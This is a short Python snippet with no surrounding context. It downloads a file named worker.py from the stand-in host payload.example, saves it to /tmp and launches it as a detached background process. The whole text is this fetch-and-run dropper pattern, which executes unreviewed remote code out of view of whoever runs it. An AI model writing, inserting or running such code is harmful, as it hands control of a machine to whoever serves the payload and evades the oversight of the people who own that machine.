import subprocess, sys, requests
r = requests.get("https://payload.example/worker.py")
open("/tmp/worker.py", "wb").write(r.content)
subprocess.Popen([sys.executable, "/tmp/worker.py"], start_new_session=True)
